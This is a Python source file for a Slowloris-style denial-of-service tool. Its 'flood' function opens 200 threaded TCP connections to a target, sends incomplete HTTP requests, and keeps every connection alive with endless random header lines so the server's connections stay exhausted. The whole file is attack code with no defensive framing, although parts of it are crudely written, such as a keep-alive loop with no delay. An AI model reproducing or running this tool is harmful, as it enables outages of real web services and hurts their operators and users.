import random
import socket
from colorama import Fore
import threading
from queue import Queue

def create_socket(target, q):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        sock.connect((target[0], target[1]))

        sock.send("GET / HTTP/1.1\r\n".encode("utf-8"))
        sock.send("Connection: keep-alive\r\n".encode("utf-8"))
        q.put(sock)
    except socket.timeout:
        print(f"{Fore.RED}[-] {Fore.MAGENTA}Timed out..{Fore.RESET}")
    except socket.error:
        print(f"{Fore.RED}[-] {Fore.MAGENTA}Failed create socket{Fore.RESET}")
    else:
        print(f"{Fore.GREEN}[+] {Fore.YELLOW}Socket created..{Fore.RESET}")

def keep_alive(sock, index):
    while True:
        try:
            sock.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
        except socket.error:
            print(f"{Fore.RED}[-] {Fore.MAGENTA}Failed to send keep-alive headers{Fore.RESET}")
            break
        else:
            print(f"{Fore.GREEN}[+] {Fore.YELLOW}Sending keep-alive headers from socket {index}. {Fore.RESET}")
    sock.close()

def flood(target):
    # Create sockets
    sockets = []
    q = Queue()
    for _ in range(200):
        t = threading.Thread(target=create_socket, args=(target, q))
        t.daemon = True
        t.start()

    while q.qsize() > 0:
        sock = q.get()
        sockets.append(sock)

    # Send keep-alive headers
    for index, sock in enumerate(sockets):
        t = threading.Thread(target=keep_alive, args=(sock, index+1))
        t.daemon = True
        t.start()
    
    # Wait for threads to complete
    for t in threading.enumerate():
        if t != threading.current_thread():
            t.join()
